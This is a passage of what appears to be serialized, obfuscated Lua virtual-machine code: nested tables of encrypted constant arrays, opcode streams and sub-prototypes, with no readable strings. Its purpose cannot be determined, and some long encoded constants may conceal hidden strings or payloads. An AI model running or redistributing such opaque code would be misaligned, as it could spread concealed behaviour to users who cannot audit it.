1,6,32,30,69,6,17,4,41,520,41,522,41,588,28,35,51,7,6,11,30,69,4,52,20,6,19,6,13,19,6,4,3,59,15,558,17,4,51,20,15,588,28,6,6,34,30,28,15,51,20,69,7,52,23,28,45,6,44,30,39,1,51,23,69,7,17,4,41,588,41,590,41,584,27,5,27,4,27,7,27,6,27,1,27,0,27,3,27,2,27,13,27,12,27,15,27,14,27,9,27,8,27,11,27,10,27,21,27,20,27,23,41,5,20,5},P={},U={{1,11},{1,14},{1,7},{1,1},{1,16},{1,8}},nParams=0},{K={{111,253,110,245},{107,252,119,235},1,{49,237,69,198,75,208,80,192,84},{106,201,69},{84,206,81,215,86,204,72,192},{116,209,70,214,108,194},{76,194,73,192},{109,197,72,195},{84,201,71,196,77,224,78},{66,199,74,205},{118,203,73,202,79,226,72},{77,199,75,227,79},{98,198,72,226,72}},C={28,5,6,4,30,6,7,69,4,17,4,39,5,6,6,10,59,6,1,28,0,39,4,6,3,30,69,4,13,59,6,2,39,4,6,13,30,13,59,6,12,28,0,28,15,6,14,30,69,4,13,59,6,9,28,15,6,8,30,13,69,7,17,4,20,5},P={},U={{1,13},{1,7}},nParams=0},{K={3,2,9,{91,241,85,204},{75,197,77,199,83,203,87,210,116,220,72,222,78},{115,213,67,209,80,192,66},{14,209,70,202,65},{86,194,86,194,67,211,125,192,78},{87,203,86,210,85,193,71,205},{113,214,67,213,97,205},{70,201,67,205},{71,195,69,192,68,224,73,212}},C={6,5,6,4,48,6,7,3,59,15,29,17,4,51,5,28,6,6,1,30,6,0,30,3,15,59,39,5,6,3,10,59,6,2,28,13,39,4,6,12,30,69,4,13,59,6,15,39,7,13,59,6,14,39,6,13,69,7,17,4,41,59,20,5},P={},U={{1,13},{1,7},{1,19},{1,10}},nParams=1},{K={{118,253,105,246},{122,241,113,240,82}},C={28,5,6,4,30,51,5,39,5,26,62,4,-1,20,-1},P={},U={{1,21}},nParams=1},{K={{107,255,124,242,115},{79,248,106,220,79,211,71},{78,251,113,196,111,205,87,205,67,207,68,201,93,195,68,194},{74,246,84,205,71},{75,197,89,214},{100,212,80,194,80,204,73,201},3},C={28,5,39,5,6,4,30,39,5,6,7,10,59,6,6,51,5,13,59,6,1,51,4,13,59,6,0,6,3,13,69,1,17,4,20,5},P={},U={{1,5}},nParams=2},{K={{82,242,110,234,126,206,66,199},{114,248,105},{72,215,92,207,83,204,70,214},{93,240,82,207,71,209,118,196,66,206,93,218},{74,228,72,207},0,4,{114,194,86,192,72,211}},C={28,5,6,4,30,6,7,69,4,52,7,51,7,6,6,31,28,1,6,4,30,6,0,39,5,51,4,59,37,15,38,17,4,6,3,62,4,-1,1,4,13,51,7,6,2,51,5,13,20,5},P={},U={{1,22}},nParams=2},{K={{82,242,110,234,126,206,66,199},{114,248,105},{72,215,76,212,83,205,72,193},{74,247,73,194,73,205,65,214,85},1,{99,206,78,204,86},{113,195,81,193,75,210}},C={28,5,6,4,30,6,7,69,4,52,6,51,6,6,6,51,4,59,37,15,28,17,4,6,1,13,51,6,6,0,51,7,59,37,15,45,17,4,39,5,13,51,6,6,3,51,5,13,20,5},P={},U={{1,28}},nParams=3},{K={{82,242,110,234,126,206,66,199},{114,248,105},{72,215,79,193,69,198,74,202,66},{78,254,68,197,75,205,67,241,73,215},{74,228,72,207},0,{113,195,71,192,76,200,64,234,70,222,95,195,64},{114,194,64,193,79,201,79,229,79,205,88},{115,197,65,194,78,198,78,248,66,203,69,218},{116,196,84,194,70,221}},C={28,5,6,4,30,6,7,69,4,52,7,51,7,6,6,28,1,6,4,30,6,0,51,4,69,7,13,51,7,6,3,28,1,6,4,30,6,0,51,4,69,7,13,51,7,6,2,28,1,6,4,30,6,0,51,4,69,7,13,51,7,6,13,28,1,6,4,30,6,0,51,4,69,7,13,51,7,6,12,51,5,13,20,5},P={},U=nil,nParams=2},{K={{82,242,110,234,126,206,66,199},{114,248,105},{73,251,103,212,109,195,65,193,73},{92,254,67,202,69,209,75,208,72,195,124,219,75,197,95,221,79,221,85,223,81,202},1,{116,196,90,215},{117,199,91,208,118,207,93,205},11,{119,193,93,210,100,199,69,197,89,159},{98,202,72,211},{96,200,82,197},{97,200,92,193,75,198},{115,205,81,222,115,237,65,199,72,222,92,215,93,192},{100,204,76,223},{125,207,83,216,116,239,67,217,86,220,94,209,91,194},{105,206,66,217,75,221},{123,205,95,203,65,196}},C={28,5,6,4,30,6,7,69,4,52,3,51,3,6,6,6,1,13,51,3,6,0,51,4,13,51,3,6,3,39,5,51,7,59,37,15,44,17,4,6,2,69,4,13,51,3,6,13,51,6,59,37,15,63,17,4,39,4,13,51,3,6,12,51,1,59,37,15,74,17,4,28,15,6,12,30,6,14,30,13,51,3,6,9,51,0,59,37,15,97,17,4,28,15,6,9,30,6,8,30,13,51,3,6,11,28,15,6,11,30,6,10,30,13,51,3,6,21,51,5,13,51,3,20,4},P={},U={{1,22},{1,35}},nParams=6},{K={{82,242,110,234,126,206,66,199},{114,248,105},{73,251,103,212,99,215,87,208,74,200},{92,254,67,202,69,209,75,208,72,195,107,198,70,196,94,158},{93,207,83,198,70,214,118,207,93,205,121,195,83,201,65},0,{117,199,91,208},{118,198,92,209,101,200,68,198,88,152},{119,193,93,210,116,193,83,207},11,{99,201,73,220},{99,201,93,196},{96,199,93,194,74,193,111,193,67,212},{105,220,94,196,110,216,90,219,95,223,113,220,88,218,68},{121,203,89,201,67,218},4,{102,195,88,221,74,245,95,198,86,198},{111,194,64,193,85,210,70},{96,193,90,195,84,254,86,213,67,211}},C={28,5,6,4,30,6,7,69,4,52,1,51,1,6,6,51,7,59,37,15,28,17,4,39,5,13,51,1,6,1,6,0,13,51,1,6,3,51,4,13,51,1,6,2,39,4,13,51,1,6,13,39,7,51,6,59,37,15,58,17,4,6,12,69,4,13,51,1,6,15,28,14,6,15,30,6,9,30,13,51,1,6,8,44,13,51,1,6,11,51,5,13,39,6,51,1,6,10,69,7,17,4,51,7,59,37,15,117,17,4,39,5,52,0,51,1,6,21,30,59,6,20,30,68,54,4,69,7,17,4,51,1,6,23,30,59,6,20,30,68,54,7,69,7,17,4,51,1,20,4},P={{K={{89,253,126,245,120,210,78,215,77,192,102,201,75,199,91,153},{80,248,108,239},{94,241,115,207,83,145},{112,250,87},1,0.1},C={39,5,6,5,39,4,59,6,4,30,68,28,7,6,6,30,6,1,6,1,6,1,69,6,6,0,69,6,13,20,5},P={},U={{1,4},{1,5}},nParams=0},{K={{89,253,126,245,120,210,78,215,77,192,102,201,75,199,91,153}},C={39,5,6,5,39,4,13,20,5},P={},U={{1,4},{1,5}},nParams=0}},U={{1,27},{1,35},{1,22},{1,36}},nParams=4},{K={{82,242,110,234,126,206,66,199},{114,248,105},{73,251,103,212,99,205,91},{92,254,67,202,69,209,75,208,72,195,107,198,70,196,94,158},{93,207,83,198,70,214,118,207,93,205,121,195,83,201,65},0,{113,206,66,199,64,206,72,196,77,207,89,248,72,214,91},{},{115,200,68,197,66,192,70,198,79,201,95,237,64,220,94,192,0},{112,192,94,211},{113,195,95,220,106,197,71,195,95,157},{114,194,80,221,121,194,86,200},11,{110,198,68,223},{108,196,94,193},{109,196,88,197,79,194},{104,192,72,207,93,228,84,202,71,251,91,240,88,219,76,201},{97,216,66,219,89,253,91,221,81},{121,203,87,196,105,243,95,221,82,216,90,221,87,206},{98,202,86,197},{123,213,73,198,106,245,89,223,80,214,84,223,85,200},{100,222,66},{114,215,93,192,80,196},{98,210,70,208,88,195},4,1},C={28,5,6,4,30,6,7,69,4,52,6,51,6,6,6,39,5,13,51,6,6,1,6,0,13,51,6,6,3,51,4,59,37,15,34,17,4,6,2,13,51,6,6,13,39,4,13,51,6,6,12,6,2,13,51,6,6,15,39,7,13,51,6,6,14,39,6,6,9,69,4,13,51,6,6,8,28,11,6,8,30,6,10,30,13,51,6,6,21,44,13,51,6,6,20,51,7,59,37,15,109,17,4,44,13,51,6,6,23,28,11,6,23,30,6,22,30,13,51,6,6,17,51,7,59,15,140,17,4,28,11,6,17,30,6,16,30,59,37,15,146,17,4,28,11,6,17,30,6,19,30,13,51,6,6,18,51,5,13,39,1,51,6,6,29,69,7,17,4,39,0,51,6,6,28,39,3,69,6,17,4,51,6,20,4},P={},U={{1,26},{1,33},{1,35},{1,22},{1,36},{1,37},{1,28}},nParams=3},{K={{77,245,110,247,125,204,68}},C={39,5,6,5,44,13,20,5},P={},U={{1,45}},nParams=0},{K={{52,255,113,247,122,206,85,209,28,197,65,203,78,198,98,207,82,145},7,49,{110,252,65,205,78},{85,243,110,236,103,193,70,201,67,205},1,2,{86,218,84,192},{87,197,71,202,66},{77,213,71,206,90,218},{10,213,66,198,77},{82,198,90,206,79,223,121,196,74},{82,193,77},{75,198,78,206},{118,245,126,226,97,225,110,244,110,237},{75,207,65,196,64,228,85,200},{95,205,94,197},{91,204,71,219},0.3,{106,202,67,197,64,220,77}},C={39,5,6,5,39,4,5,69,4,52,5,6,4,6,4,26,6,7,3,59,15,31,17,4,51,5,15,152,28,6,39,7,6,1,30,39,7,51,5,62,6,7,52,7,52,4,6,0,6,0,16,6,3,3,59,15,78,17,4,51,4,59,15,78,17,4,28,2,51,7,69,4,6,13,3,15,158,28,12,51,7,62,4,6,52,0,52,1,52,6,35,6,1,0,27,3,27,2,51,6,51,1,51,0,62,7,7,52,2,52,3,51,3,52,0,51,3,12,0,15,156,39,6,6,15,10,59,6,14,51,2,6,9,30,13,59,6,8,6,11,13,59,6,10,39,4,13,69,7,17,4,41,91,41,158,41,152,28,21,6,20,30,6,23,69,4,17,4,39,1,59,6,22,30,68,69,4,17,4,20,5},P={},U={{1,14},{1,10},{1,1},{1,13},{1,42}},nParams=0},{K={{82,242,110,234,126,206,66,199},{114,248,105},{91,236,126,205,68},{77,246,90,196},{74,228,72,207,17},1,0,{114,204,87,204,82,206,71,199},{97,197,70,205,64,218,70,223,69,200,121,220,78,222,66,194,82,198,80,216,84,193},{114,204,85,206,74,197,79},{117,199,85,205,71,222}},C={28,5,6,4,30,6,7,69,4,52,5,51,5,6,6,28,1,6,4,30,6,0,6,3,6,3,39,5,69,1,13,51,5,6,2,28,1,6,4,30,6,3,6,3,6,3,39,4,69,1,13,51,5,6,13,6,0,13,51,5,6,12,44,13,51,5,6,15,39,7,13,51,5,20,4},P={},U={{1,59},{1,58},{1,45}},nParams=0},{K={{114,236,124,247,109,211},{74,244,109,246,66,205,71},{73,251,103,212,98,205,79,203,87,149}},C={28,5,39,5,62,4,6,52,6,52,7,52,4,35,4,7,6,27,1,27,0,51,4,51,7,51,6,62,7,7,52,0,52,1,51,1,52,6,51,1,12,0,15,79,39,4,51,0,30,6,4,44,13,39,7,51,0,30,6,7,39,6,13,39,1,51,0,30,6,4,44,13,41,20,39,4,51,5,30,6,4,49,13,39,7,51,5,30,6,7,39,0,13,39,1,51,5,30,6,4,49,13,20,5},P={},U={{1,54},{1,57},{1,55},{1,33},{1,56},{1,30}},nParams=1},{K={},C={39,5,39,4,69,4,17,4,20,5},P={},U={{1,65},{1,70}},nParams=0},{K={2,{113,252,106,247},{123,242,112,207,83},10,{76,201,91,199},{117,229,75,206,22},{79,199,84},0,{115,203,86,207,83,193,70,196}},C={51,7,6,5,19,52,1,28,4,6,7,30,51,7,6,5,71,69,4,52,0,39,5,39,4,51,5,51,4,6,6,69,1,52,3,51,3,6,1,28,0,6,3,30,6,2,51,6,59,15,50,17,4,39,7,59,37,15,58,17,4,39,6,6,2,39,1,69,1,13,51,3,6,13,28,0,6,3,30,6,2,39,0,51,6,59,15,89,17,4,6,2,59,37,15,111,17,4,51,1,39,6,39,3,16,26,16,6,2,39,2,51,0,39,1,39,13,16,26,16,69,1,13,51,3,20,4},P={},U={{1,40},{1,75},{1,78},{1,86},{1,61},{1,77},{1,60},{1,85},{1,62}},nParams=4},{K={{52,255,113,247,122,206,85,209,28,197,65,203,78,198,98,207,82,145},15,225,{110,252,65,205,78},{85,243,110,236,103,193,70,201,67,205},100,7,2,{87,221,85,195},{80,196,68,203,77},{76,214,70,193,91,217},{83,206,76},{96,205,93,233,67,197,65,202,93,213,95},12,144,{99,216,109},{127,201,85,218,109,197,69,198,92,218},{104,200,93,219,66,222,75},0,1,{102,222,66,198,82,218,86,211},{94,212,69},{98,219,73,209},{103,247,93,216,4},4,30,{119,215,84,211,94,200,84,201,83,218,124,175,45,173,49,247},{116,216,74,221,95,201,111,212,68,218,16,168,58,166,40},{99,221,65,206},{},{120,207,79,211,127,203,75,180,46,172,0,171,41,169,53},{118,218,69,210,75,203,15,179,38,166,54},3,9,{109,223,77,165,47,182},{220,41,246},{253,119},{5,175,55,174},{7,173,45,176},{5,172,48,173,39,170,10,166,38,175},14,{20,170,53,174,60,160,37,165},5,{18,162,48,189,18,138,32,164,41,161,61,180,60,167},{4,173,39,190,46,190},{38,168,39,174},11,{13,164,56,165,47,162,3,180,63,186,54,186,58,179},20,18,{0,161,58,163,52,144,38,160,33,185,57,233,26,182,50,191,54},{13,160,62,191,55,176,32},{2,191,36,161,54,145,59,162,50,170},{29,190,39,160,49,153,51,182,46,188},{18,179,61,162,52,165,4,177,35,191},34,6,{23,154,24,153,29,154,14,158,24,253,126}},C={39,5,6,5,39,4,5,69,4,52,5,6,4,6,4,26,6,7,3,59,15,30,17,4,51,5,37,15,36,20,5,41,36,28,6,39,7,6,1,30,39,7,51,5,62,6,7,52,7,52,4,6,0,6,3,19,6,2,3,59,15,87,17,4,51,4,37,59,37,15,87,17,4,28,13,51,7,69,4,6,12,0,15,93,20,5,41,93,10,40,6,28,15,51,7,62,4,6,52,0,52,1,52,6,35,6,1,0,27,3,27,2,51,6,51,1,51,0,62,7,7,52,2,52,3,51,3,52,0,51,3,12,0,15,150,39,6,51,2,6,14,30,51,2,13,41,105,31,28,15,39,1,59,6,9,30,68,62,4,-1,1,6,52,15,52,12,52,13,35,13,12,15,27,14,27,9,51,13,51,12,51,15,62,7,7,52,9,52,14,51,14,52,15,51,14,12,0,15,245,6,8,6,8,26,6,11,3,59,15,218,17,4,51,9,59,6,10,30,68,6,21,69,7,15,235,51,9,59,6,20,30,68,69,4,17,4,41,235,41,169,6,23,52,8,28,15,51,7,62,4,6,52,21,52,10,52,11,35,11,10,21,27,20,27,23,51,11,51,10,51,21,62,7,7,52,23,52,20,51,20,52,21,51,20,12,0,15,734,51,8,6,22,16,52,8,28,17,6,16,30,6,21,69,4,52,22,51,22,6,19,31,28,18,6,16,30,6,22,39,0,6,29,69,4,42,6,23,39,0,6,28,62,4,-1,1,4,13,51,22,6,31,51,23,6,14,30,39,3,3,59,15,353,17,4,39,2,59,37,15,361,17,4,39,13,13,51,22,6,30,6,23,13,51,22,6,25,6,24,13,51,22,6,27,44,13,51,22,6,26,51,8,13,39,12,51,22,6,29,69,7,17,4,6,37,6,2,48,6,36,3,59,15,418,17,4,51,23,6,14,30,39,3,3,15,434,39,15,51,22,6,22,39,14,69,6,17,4,41,434,51,22,6,39,39,1,13,39,9,51,22,51,23,6,14,30,39,3,3,59,15,468,17,4,6,38,59,37,15,476,17,4,6,33,6,36,51,23,6,14,30,39,3,3,59,15,495,17,4,39,8,59,37,15,503,17,4,39,11,28,32,6,35,30,6,34,30,69,0,52,17,51,17,6,19,28,18,6,16,30,6,23,39,0,6,45,69,4,6,22,6,23,69,1,13,51,17,6,44,28,18,6,16,30,6,23,39,0,6,47,69,4,6,23,6,23,69,1,13,51,17,6,46,28,32,6,46,30,6,41,30,13,39,9,51,22,51,23,6,40,30,6,43,51,23,6,14,30,39,3,3,59,15,592,17,4,39,8,59,37,15,600,17,4,39,14,28,32,6,35,30,6,42,30,69,0,52,16,51,16,6,19,28,18,6,16,30,6,22,39,0,6,53,69,4,42,6,22,6,23,69,1,13,51,16,6,44,28,18,6,16,30,6,23,39,0,6,52,69,4,6,23,6,23,69,1,13,51,23,6,14,30,52,19,51,22,6,55,30,59,6,54,30,68,54,4,69,7,17,4,51,22,6,49,30,59,6,54,30,68,54,7,69,7,17,4,51,22,6,48,30,59,6,54,30,68,54,6,69,7,17,4,27,22,27,17,27,16,27,19,41,256,39,1,6,51,28,18,6,16,30,6,23,6,23,6,23,51,8,39,0,6,50,69,4,26,39,0,6,61,69,4,16,69,1,13,39,23,6,25,6,60,51,8,5,13,20,5},P={{K={{79,249,101,234},{114,252,115,250},{72,215,91,128},{20,207,76,192,65,198,4},{107,207,82,214,81,205,75,193},{80,205,67,192,65,236,66},{1,130,105,203,71,134},{81,215,86,204,72,192},{80,209,71},{78,202,68,238,76},1,28,{197,40,143}},C={39,5,40,4,39,7,6,5,39,6,6,4,30,13,39,1,6,5,6,7,39,5,6,6,28,1,39,6,6,0,30,69,4,6,3,28,2,6,13,30,28,1,39,6,6,12,30,69,4,6,15,6,14,69,6,6,9,5,5,5,5,5,5,13,39,0,69,5,17,4,20,5},P={},U={{1,22},{0,6},{0,15},{1,18},{0,16},{0,17}},nParams=0},{K={7,49,{104,247,123},{92,254,67,202,69,209,75,208,72,195,107,198,70,196,94,158}},C={6,5,6,5,26,6,4,3,59,15,16,17,4,39,5,6,7,30,39,4,0,15,37,39,7,6,6,39,6,13,41,37,20,5},P={},U={{1,18},{0,6},{1,19},{0,7}},nParams=0},{K={1,2,{104,247,123},{92,254,67,202,69,209,75,208,72,195,107,198,70,196,94,158}},C={6,5,6,5,16,6,4,3,59,15,16,17,4,39,5,6,7,30,39,4,0,15,37,39,7,6,6,39,6,13,41,37,20,5},P={},U={{1,18},{0,6},{1,19},{0,8}},nParams=0}},U={{1,14},{1,10},{1,1},{1,100},{1,80},{1,22},{1,99},{1,27},{1,26},{1,36},{1,37},{1,34},{1,39},{1,30},{1,33},{1,82},{1,84},{1,102},{1,79}},nParams=0},{K={15,225,100,7,2,{116,196,78,198,84,202,84,211,124,198,122,199,77,206,75,230,94,194,70,210,90,214,83},{85,205,77,209,72,196,66,218},{82,207,69,198,67,238,76},{73,203,71,239,67}},C={6,5,6,5,26,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,39,5,30,52,5,6,7,6,6,19,6,1,3,59,15,41,17,4,51,5,15,78,39,7,59,6,0,30,68,28,3,51,5,6,2,30,69,4,51,5,6,13,30,39,6,69,1,17,4,41,78,20,5},P={},U={{1,99},{1,100},{1,2},{1,7}},nParams=0},{K={12,144,3,2,9,{84,206,81,215,86,204,72,192},{75,205,65,237,65},{69,194,73,192},{105,203,71,239,67},{96,236,96,225,109,251,111,229,120,141,125,234,98,231,119,225},{112,213,66,136,121,223,71,192,13,218,64,144,124,215},{101,207,73,219,75,200,88,200,92},7,49,{121,216,66,193,76,220,86,224,80,192,71},{122,196,95,196,90,198,95,223},{104,234,95,207,66,213},{3,222,75,193,84},{89,207,93,215,84,198,102,221,81},{77,192,84,212},{92,196,67,219,93,211},{86,222,64,222,85,193},{93,221,80,213,89,150,84,133,94,219,86,217,7,249,90,180,18,167,49,178,44,165,34,224,107,154,39,173,52,171,61,163,115,251,125,152,58,181,54,180,9,182,58,165,56,172,113,163,9,131,17,133,6,146,2,154,99,134,4,143,12,130,79,130,76,145,83,149,27,146,87,155,67,173,26,149,9,184,16,114,194,106,234,104,225,46,165,64,252,103,234,98,226,103,235,66,254,125,231,68,244,100,227,58,181,47,178,22,244,120,191,82,129,86,203,65,203,6,213,6,234,108,217,77,192,75,146,115,247,64,210,89,208,24,217,93,206,18,158,90,145,27,217,108,228,36,234,110,134,0,181,41,164,47,229,13,163,41,163,53,162,122,227,120,240,48,251,104,240,122,190,50,185,84},{106},{106},{110},{88,215,67,208},{87,195,89,215,8},{123,215,86,209,109,217,94,202,80,178},{89,221,87,210,82,246,91,198},{109,234,27,239,120,240,107},{84,218,81,216},{4},{28,202,95,205,48,164,38}},C={6,5,6,5,26,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,39,5,30,52,5,6,7,6,6,48,6,1,3,59,15,67,17,4,51,5,37,59,37,15,67,17,4,28,0,51,5,6,3,30,69,4,28,0,28,2,6,13,30,69,4,0,15,83,39,7,6,12,6,15,69,7,17,4,20,5,41,83,39,6,6,14,30,52,4,6,9,6,9,26,6,8,3,59,15,124,17,4,51,4,37,59,37,15,124,17,4,51,4,6,11,30,37,15,122,20,5,41,122,51,4,6,11,30,6,10,30,52,7,51,4,6,11,30,6,21,30,52,6,39,1,6,20,10,59,6,23,39,5,13,59,6,22,31,28,17,6,16,30,6,19,51,7,6,18,30,51,7,6,29,30,6,7,16,51,7,6,28,30,28,31,6,30,30,51,6,6,25,30,6,18,30,51,6,6,25,30,6,28,30,62,7,-1,1,4,13,59,6,24,39,0,13,69,7,17,4,39,7,6,27,51,5,6,26,30,59,37,15,244,17,4,6,37,6,36,5,69,7,17,4,20,5},P={},U={{1,99},{1,100},{1,23},{1,7},{1,13},{1,10}},nParams=0},{K={1,2,{50,237,122,206,69},{106,254,82,198,71,215,113,204,66},{124,207,69,199},{71,192,79,198,30,226,67,211,123,204,88,221,69,206,75,135,18,225,94,210,77,208,68,196,26,144,20,247,83,222,95,211,16,173,35,186,33,183,124,140,33,170,33,227,110,239,103},{64,198,78,205,75,237,66,209},{105,234,103,238,99,227},{77,197,72,195},{27}},C={6,5,6,5,16,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,6,7,10,59,6,6,39,5,13,59,6,1,6,0,13,59,6,3,39,7,13,69,7,17,4,39,6,6,2,39,1,39,5,30,59,15,66,17,4,39,1,39,5,30,6,13,30,59,37,15,74,17,4,6,12,69,7,17,4,20,5},P={},U={{1,99},{1,13},{1,10},{1,23},{1,100}},nParams=0},{K={15,225,{50,237,122,206,69},{106,254,82,198,71,215,113,204,66},{124,207,69,199},{87,201,75,207,65,133,82,213,93,204,10,207,67,141,66,192,83,208,94,147,64,136,77,202,24,223,85,201,28,212,3,142,108,240,39,244,100,161,41,231,60,146,35,150,113,182,51,239,53,191,54,243,49,187,50},{64,198,78,205,75,237,66,209},{97,241,101,246,110,135,123,236,100,255},{}},C={6,5,6,5,26,6,4,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,6,7,10,59,6,6,39,5,13,59,6,1,6,0,13,59,6,3,39,7,13,69,7,17,4,39,6,6,2,6,13,69,7,17,4,20,5},P={},U={{1,99},{1,13},{1,10},{1,23}},nParams=0},{K={100,7,2,{49,236,69,207,70},{107,193,83,197,70,208,112,207,67},{67,206,70,198},{77,205,64,197,73,134,75,216,20,205,74,193,72,148,104,213,69,225,86,198,67,223,84,221,17,152,107,208,92,199,90,178,50,224,106,234,9,169,36,169,37,154,39,173,52,171,61,218,61,189,48,181,57,246,34,177,42,231,60,189,48,187,101,167,4,150,48,129,23,144,14,139,12,194,73,185,30,139,29,185,31,130,6,128,38,147,5,142,16,153,30,222,84,244,19,111,226,99,239,36,226,115,238,53,229,122,177,91,236,103,251,86,254,96,208,124,252,122,243,48,187,74,247,125,228,123,237,103,212,75,129,13,175,74,200,75,200,70,139,67,193,74,146,87,196,91,137,114,220,88,211,126,208,72,200,72,254,86,214,44,165,106,225,27,154,21,229,97,233,35,173,108,162,34,171,112,165,58,182,58,245,57,187,60,227,30,190,47,169,44,176,25,201,75,195,1,139,2,237,4,134,9,138,0,205,24,159,77,134,29,129,31,134,6,150,27,156,84,184,9,143,12,154,238,117,193,98,233,96,244,102,166,95,227,110,251,125,225,125,228,66,251,105,241,31,250,120,251,120,246,59,241,114,252,34,213,72,209,13,240,74,211,68,192,108,196,74,206,65,203,75,144,80,220,87,148,91,217,67,152,76,211,72,146,112,209,74,179,36,135,45,165,39,170,34,172,105,165,57,228,59,190,97,136,109,234,99,228,117,185,37,248,47,170,117,133,97,235,111,208,72,232,15,139,6,135,11,200,26,141,86,165,3,157,27,145,31,145,22,218,27,147,0,208,91,169,24,142,24,155,17,71,244,107,161,45,165,117,224,38,199,107,230,105,176,44,208,79,194,48,179,103,242,56,197,125,234,127,239,83,243,77,239,65,214,76,158,66,196,74,212,77,137,89,204,2,228,73,193,95,195,87,244,65,220,127,217,75,220,78,134,72,207,75,218,96,178,37,237,30,140,40,163,45,177,8,174,36,172,56,166,63,163,111,150,58,160,59,249,2,144,52,191,57,165,28,186,8,128,20,138,11,151,72,180,1,139,6,130,2,138,78,156,23,223,34,146,6,144,24,131,69,158,15,146,118,145,17,156,225,109,162,106,233,98,187,78,230,122,254,106,226,110,235,33,254,116,229,59,182,92,251,118,255,124,214,122,254,120,242,61,137,1,203,78,195,11,245,78,210,76,151,126,232,68,195,29,158,95,215,68,156,4,154,7,148,8,150,11,149,29,215,82,167,111,128,34,167,46,161,53,167,60,164,47,143,34,162,32,162,98,239,16,187,57,185,37,235,119,180,62,171,117,238,115,208,77,210,74,196,12,139,0,198,43,139,8,135,10,156,0,133,31,150,39,134,20,152,4,136,24,136,30,146,30,135,66,48,161,107,238,99,171,92,206,102,237,111,243,49,180,55,182,26,248,127,244,58,198,117,246,116,252,78,226,108,248,35,242,79,195,2,194,74,193,6,226,70,220,71,133,127,206,79,195,85,229,75,195,81,155,112,222,76,153,85,201,28,248,80,202,45,239,17,160,37,169,35,147,49,185,47,229,31,185,60,170,36,178,58,243,61,184,49,249,17,180,59,188,57,137,44,190,14,146,18,130,22,128,8,132,17,212,90,203,5,128,9,193,32,144,0,150,26,129,75,132,31,243,22,148,31,156,18,223,223,101,191,74,234,118,242,102,230,106,239,37,226,104,249,39,178,85,247,112,245,121,180,62,184,70,254,53,200,120,230,107,213,83,199,30,134,87,196,95,201,90,217,78,216,68,202,21,159,30,131,10,131,7,132,6,129,9,136,12,158,29,215,82,167,111,139,46,165,34,163,122,151,45,228,31,169,53,186,58,162,52,242,12,176,111,146,50,171,45,168,52,165,117,247,85,137,7,194,14,139,7,198,19,128,12,132,75,152,12,157,4,222,2,130,18,131,27,222,17,141,23,153,15,149,18,144,87,41,161,100,236,118,165,111,186,57,165,56,187,44,233,97,175,121,252,117,189,68,250,101,254,108,240,117,245,33,200,90,246,77,147,12,205,65,210,14,151,4,196,75,223,68,131,92,206,94,213,93,222,28,152,7,133,20,136,8,146,16,141,18,210,33,181,42,237,54,164,40,163,39,164,98,230,125,255,98,254,98,248,123,243,32,180,37,188,118,174,59,178,40,245,110,241,80,213,75,195,1,139,2,199,1,132,13,197,60,130,29,134,4,152,29,157,73,160,50,158,21,203,84,149,25,138,86,207,172,49,174,51,168,53,175,39,237,103,238,34,172,104,224,107,154,101,243,96,255,59,242,114,244,120,227,51,174,51,171,51,198,84,204,64,208,76,201,73,128,0,160,71,195,78,207,67,144,69,197,14,211,84,219,82,130,126,223,79,239,88,204,73,169,34,167,107,230,17,177,34,173,39,153,46,190,59,167,44,181,115,251,105,151,39,179,54,172,60,242,50,177,58,242,11,151,4,135,13,173,11,128,8,198,7,143,28,196,93,192,89,217,93,137,58,153,20,145,18,172,11,155,21,143,13,159,13,101,239,97,250,57,180,42,197,105,234,97,236,126,226,123,225,116,197,96,242,122,230,102,246,106,252,116,248,101,160,47,226,9,171,86,212,30,245,74,198,81,129,3,139,88,218,0,236,95,220,66,223,81,193,83,211,2,250,85,213,82,216,93,203,104,167,55,173,39,177,47,168,38,225,99,235,63,170,116,139,53,162,38,161,59,172,126,254,120,188,52,191,117,215,59,177,4,200,104},{67,199,73,204,72,236,77,208},{105,241,104,246,116,235,104,248,110},{}},C={6,5,6,4,19,6,7,3,59,15,21,17,4,39,5,37,15,19,20,5,41,19,39,4,6,6,10,59,6,1,39,5,13,59,6,0,6,3,13,59,6,2,39,7,13,69,7,17,4,39,6,6,13,6,12,69,7,17,4,20,5},P={},U={{1,99},{1,13},{1,10},{1,23}},nParams=0},{K={12,144,3,2,9,{116,196,90,215},{114,242,122,132,102,238,102,252},{96,194,71,206,65,213,71,220,68,207,111,194,66,192,66,130},{96,203,73,201,85,155},{66,215,73,202,122,238,104},20,70,{116,248,112},{123,253,101,251,124,232,106},{122,254,100,252,13,253,127,233},{5,216,73,195,74},{95,205,95,201,74,196,100,219,87},{79,194,74,202},{94,218,93,217,95,213},{72,192,66,220,83,199},{67,223,82,211,95,148,93,197,10,223,88,215,94,134,122,219,75,147,36,176,53,173,38,163,111,234,1,190,63,188,30,171,61,166,56,177,54,246,124,246,59,183,58,187,55,252,49,174,98,135,0,143,6,222,34,131,19,187,12,152,29,133,14,139,71,210,33,158,18,141,16,132,4,218,80,212,55,147,30,159,19,80,237,99,250,97,247,12,235,103,234,107,231,44,235,123,225,115,229,123,252,122,181,100,191,119,176,58,242,122,189,109,230,78,129,67,205,64,133,85,222,70,135,88,206,93,216,75,220,68,145,70,219,81,219,22,197,93,205,79,201,82,157,77,198,46,239,48,166,53,176,35,180,60,225,37,226,108,168,34,188,53,184,52,243,60,161,34,167,7,171,63,170,41,184,45,171,64,149,10,134,10,197,20,130,28,156,24,133,76,133,26,155,0,174,0,150,5,128,19,132,12,209,21,210,92,152,18,140,229,104,228,35,246,96,247,114,237,122,254,43,248,101,235,97,176,99,247,103,225,103,248,55,234,124,235,110,249,110,234,55,207,8,130,70,202,65,134,66,198,77,160,71,220,3,237,71,209,69,198,86,208,15,245,88,214,87,223,88,200,21,216,74,174,34,182,42,171,43,238,42,187,46,227,65,188,46,175,35,188,121,160,127,175,0,164,59,229,123,255,40,243,49,177,56,194,77,175,6,144,13,137,3,213,75,186,36,191,57,204,67,184,20,147,23,145,7,133,74,131,34,216,56,147,19,138,26,110,245,47,215,125,245,99,165,85,180,40,234,124,253,98,230,115,240,102,250,123,251,57,253,107,246,116,185,97,177,92,240,68,216,31,203,87,159,108,244,103,231,111,197,79,194,74,202,24,202,71,218,80,136,66,216,75,205,72,210,82,218,22,211,48,239,23,176,33,183,15,163,97,229,36,170,33,168,115,163,32,255,28,178,57,176,122,167,42,188,103,249,63,181,63,171,66,205,15,144,3,216,